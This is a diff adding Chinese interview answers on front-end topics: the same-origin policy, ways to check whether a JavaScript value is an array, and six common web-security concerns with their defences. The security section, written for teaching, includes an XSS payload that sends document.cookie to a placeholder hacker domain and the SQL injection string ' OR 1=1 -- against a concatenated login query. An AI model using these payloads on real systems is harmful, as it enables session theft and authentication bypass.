@@ -267,13 +267,177 @@ console.log(fibonacci(6));
 
 ### 18、同源策略？
 
+同源策略 是浏览器实施的一种核心安全机制。它规定了 从一个源加载的文档或脚本，如何与来自另一个源的资源进行交互。
+
 ### 19、有哪些方法可以解决跨域？
 
 ### 20、给你一个变量，怎么判断这个变量是不是数组？
 
+**5种常用且各有优劣的方法**，覆盖不同场景需求，核心是区分“数组”与“类数组（如 `arguments`、`NodeList`）”和“普通对象”：
+
+1. `Array.isArray(arr)`（最推荐，ES5+ 支持，精准无坑）
+
+- **核心原理**：ES5 新增的数组静态方法，专门判断变量是否为“标准数组”，无视原型链和上下文。  
+- **用法**：
+
+  ```javascript
+  const arr = [1, 2, 3];
+  const obj = { a: 1 };
+  console.log(Array.isArray(arr)); // true
+  console.log(Array.isArray(obj)); // false
+  console.log(Array.isArray(null)); // false（处理 null/undefined 不报错）
+  ```
+
+- **优点**：简单、精准，不会把类数组（如 `document.querySelectorAll('div')`）误判为数组，也不受 `Array.prototype` 被修改的影响。  
+- **适用场景**：所有现代浏览器/环境（IE9+ 支持），日常开发首选。
+
+2. `arr instanceof Array`（常用，但有原型链漏洞）
+
+- **核心原理**：判断“数组实例的原型链上是否有 `Array.prototype`”，本质是检查实例与构造函数的关系。  
+- **用法**：
+
+  ```javascript
+  const arr = [1, 2, 3];
+  console.log(arr instanceof Array); // true
+  console.log({} instanceof Array); // false
+  ```
+
+- **缺点**：  
+  - 若数组的原型链被修改（如 `arr.__proto__ = Object.prototype`），会误判为 `false`；  
+  - 在 iframe 跨窗口场景中，不同窗口的 `Array` 是不同的构造函数，会把另一个窗口的数组误判为 `false`。  
+- **适用场景**：简单场景（如本地非跨窗口、不修改原型链），不推荐作为唯一判断方式。
+
+3. `Object.prototype.toString.call(arr) === '[object Array]'`（最严谨，兼容旧环境）
+
+- **核心原理**：利用 `Object.prototype.toString()` 会返回“`[object 类型]`”格式的字符串，且该方法不受原型链修改影响（除非手动重写）。  
+- **用法**：
+
+  ```javascript
+  const arr = [1, 2, 3];
+  const nodeList = document.querySelectorAll('div'); // 类数组
+  console.log(Object.prototype.toString.call(arr)); // "[object Array]" → true
+  console.log(Object.prototype.toString.call(nodeList)); // "[object NodeList]" → false
+  ```
+
+- **优点**：兼容性极强（IE6+ 支持），可精准区分数组、类数组、普通对象，是“终极兜底方案”。  
+- **缺点**：写法略繁琐，可封装成工具函数（如 `const isArr = (v) => Object.prototype.toString.call(v) === '[object Array]'`）。  
+- **适用场景**：需要兼容旧浏览器（如 IE），或对判断精度要求极高的场景。
+
+4. `arr.constructor === Array`（不推荐，易被篡改）
+
+- **核心原理**：判断变量的 `constructor` 属性是否指向 `Array` 构造函数（数组实例的 `constructor` 默认是 `Array`）。  
+- **用法**：
+
+  ```javascript
+  const arr = [1, 2, 3];
+  console.log(arr.constructor === Array); // true
+  ```
+
+- **缺点**：`constructor` 是可手动修改的（如 `arr.constructor = Object`），会直接导致判断失效；且 `null/undefined` 没有 `constructor` 属性，调用时会报错。  
+- **适用场景**：几乎不用，仅作了解即可。
+
+### 5. 排除法：`typeof arr === 'object' && arr.length !== undefined`（不精准，慎用）
+
+- **核心原理**：数组的 `typeof` 结果是 `object`，且有 `length` 属性，试图通过这两个特征判断。  
+- **用法**：
+
+  ```javascript
+  const arr = [1, 2, 3];
+  const str = 'abc'; // 字符串也有 length 属性
+  console.log(typeof arr === 'object' && arr.length !== undefined); // true
+  console.log(typeof str === 'object' && str.length !== undefined); // false（但类数组会误判）
+  ```
+
+- **缺点**：会把类数组（如 `arguments`、`NodeList`）和有 `length` 属性的普通对象（如 `{ length: 3 }`）误判为数组，精度极低。  
+- **适用场景**：绝对不推荐，仅作为反面案例了解。
+
+总结：日常开发怎么选？
+
+| 方法  | 兼容性 | 精准度 | 推荐度 |
+|------|--------|--------|--------|
+| `Array.isArray(arr)`  | IE9+   | ★★★★★  | ★★★★★  |
+| `Object.prototype.toString.call(arr)` | IE6+ | ★★★★★  | ★★★★☆  |
+| `arr instanceof Array`  | 所有   | ★★★☆☆  | ★★★☆☆  |
+| 其他方法            | -      | ★☆☆☆☆  | ★☆☆☆☆  |
+
+**一句话结论**：现代项目直接用 `Array.isArray(arr)`；需要兼容 IE6-8 就用 `Object.prototype.toString.call(arr)`，其他方法尽量不用。
+
 ### 21、Node 里面的那个ESM（ECMAScript Module，ES 模块）跟 com- ### CommonJS 有了解过吗？
 
-### 22、常见的 web 安全吗？有哪些 web 安全是需要平常去注意的？
+### 22、常见的 web 安全有了解吗？有哪些 web 安全是需要平常去注意的？
+
+日常开发中需要重点关注的 Web 安全问题，核心是防范“黑客利用漏洞窃取数据、篡改页面或攻击服务器”，以下是 **6个高频且必须注意的安全点**，结合业务场景说明如何规避：
+
+1. XSS（跨站脚本攻击）：警惕“用户输入的恶意代码”
+
+- **原理**：黑客通过评论、表单等用户输入场景，注入恶意 JS 代码（比如 `<script>窃取Cookie的代码</script>`），浏览器执行后窃取用户信息（如登录态、账号密码）。  
+- **常见场景**：  
+  - 数字资产平台的“社区评论区”：用户输入 `<script>document.location.href='http://黑客域名?cookie='+document.cookie</script>`，其他用户查看评论时，浏览器会执行这段代码，把自己的登录 Cookie 发给黑客。  
+  - 表单提交：比如“反馈表单”未过滤输入，黑客注入代码篡改页面。  
+- **防范措施**：  
+  - 核心：**过滤/转义用户输入**（把 `<` 转成 `&lt;`、`>` 转成 `&gt;` 等，让恶意代码变成“普通文本”）。  
+  - 前端：用 `React/Vue` 框架（默认会自动转义用户输入，避免直接用 `innerHTML` 插入内容）；  
+  - 后端：对存储到数据库的用户输入做二次过滤，避免“存储型 XSS”（代码存在数据库，每次加载页面都会执行）。
+
+2. CSRF（跨站请求伪造）：防止“伪造用户身份发请求”
+
+- **原理**：黑客诱导用户在“已登录目标网站”的情况下，访问黑客的恶意页面，页面会自动发送“伪造的请求”（比如转账、改密码），利用用户的登录态完成攻击。
+- **防范措施**：  
+  - 核心：**让请求携带“只有用户和服务器知道的唯一标识”**，避免被伪造。  
+  - 方案1：用 `Token`（前端登录后获取 Token，每次发请求在 Header 里带 `Authorization: Bearer Token`，黑客无法获取用户的 Token）；  
+  - 方案2：验证 `Referer`（后端检查请求的 `Referer` 头，确认是来自自己的网站，而非黑客域名，注意 `Referer` 可能被篡改，需结合 Token 使用）。
+
+3. 密码安全：绝对不能“明文存储”
+
+- **原理**：如果数据库被黑客攻破，明文存储的密码会直接泄露，用户账号批量被盗（比如早期某平台密码泄露事件，就是因为未加密）。  
+- **防范措施**：  
+  - 核心：**密码加盐哈希存储**（不可逆加密，即使数据库泄露，黑客也无法还原明文）。  
+  - 步骤：  
+    1. 用户注册时，后端生成一个随机“盐值”（如 `salt: "a8x7b9"`）；  
+    2. 把“密码+盐值”一起用哈希算法（如 `bcrypt`、`SHA-256`）加密，得到哈希值（如 `hash: "xxx..."`）；  
+    3. 数据库只存“盐值+哈希值”，不存明文密码；  
+    4. 用户登录时，后端用同样的盐值和算法加密输入的密码，对比哈希值是否一致。  
+  - 注意：禁用 MD5 算法（已被破解，不安全），优先用 `bcrypt`（自带盐值，且加密速度慢，防暴力破解）。
+
+4. SQL 注入：避免“用户输入篡改 SQL 语句”
+
+- **原理**：黑客在输入框（如登录账号、搜索框）中输入恶意 SQL 片段（比如 `' OR 1=1 --`），让后端执行的 SQL 语句逻辑改变，从而绕过验证或读取数据库数据。  
+- **常见场景**：  
+  - 登录接口后端代码：`SELECT * FROM user WHERE username='${inputName}' AND password='${inputPwd}'`；  
+  - 黑客输入账号 `' OR 1=1 --`，密码随便填，SQL 会变成 `SELECT * FROM user WHERE username='' OR 1=1 --' AND password='xxx'`——`OR 1=1` 让条件永远成立，`--` 注释掉后面的代码，直接登录成功。  
+- **防范措施**：  
+  - 核心：**用“参数化查询”替代“字符串拼接 SQL”**，让用户输入只能作为“参数”，无法篡改 SQL 结构。  
+  - 后端：用 `MySQL` 的 `prepareStatement`、`Node.js` 的 `sequelize`/`typeorm` 等 ORM 框架（自动做参数化处理），禁止手动拼接 SQL。
+
+5. 敏感数据传输：必须用 HTTPS
+
+- **原理**：HTTP 传输数据是明文，黑客可通过“抓包”窃取用户在传输过程中的敏感信息（如登录时的账号密码、支付信息）。  
+- **常见场景**：用户用 HTTP 登录数字资产平台，黑客在同一网络（如公共 WiFi）中抓包，直接拿到明文密码。  
+- **防范措施**：  
+  - 核心：**全站强制使用 HTTPS**（部署 SSL 证书，地址栏显示小绿锁），所有接口和页面都通过 HTTPS 传输。  
+  - 额外：后端对“超敏感数据”（如支付密码）做“二次加密”（比如用 RSA 非对称加密），即使 HTTPS 被破解，数据仍有一层保护。
+
+6. 接口限流：防止“恶意请求拖垮服务器”
+
+- **原理**：黑客通过“脚本批量发送请求”（如每秒发 1000 次登录请求、转账请求），导致服务器资源耗尽，无法正常提供服务（DDoS 攻击的简化版），或暴力破解密码（试遍所有可能的密码组合）。  
+- **常见场景**：  
+  - 登录接口未限流：黑客用脚本循环尝试“账号+不同密码”，暴力破解用户账号；  
+  - 转账接口未限流：大量恶意请求导致服务器卡顿，正常用户无法转账。  
+- **防范措施**：  
+  - 核心：**对接口按“IP/用户ID”设置请求频率限制**。  
+  - 方案：  
+    1. 用 `Redis` 记录请求次数（如“IP:192.168.1.1 在 1 分钟内只能请求 10 次登录接口”）；  
+    2. 超过限制时，返回 `429 Too Many Requests` 状态码，提示“请求过于频繁，请稍后再试”；  
+    3. 敏感接口（如登录、支付）可结合“验证码”（图形验证码、短信验证码），进一步防机器人攻击。
+
+总结：日常开发的“安全 checklist”
+
+1. 所有用户输入必须“过滤/转义”，防 XSS；  
+2. 敏感请求必须带 Token，防 CSRF；  
+3. 密码必须“加盐哈希存储”，禁用明文；  
+4. 后端 SQL 必须用参数化查询，防注入；  
+5. 全站强制 HTTPS，敏感数据传输加密；  
+6. 核心接口必须限流，加验证码防暴力攻击。
 
 ### 23、什么是 CSRF？
 
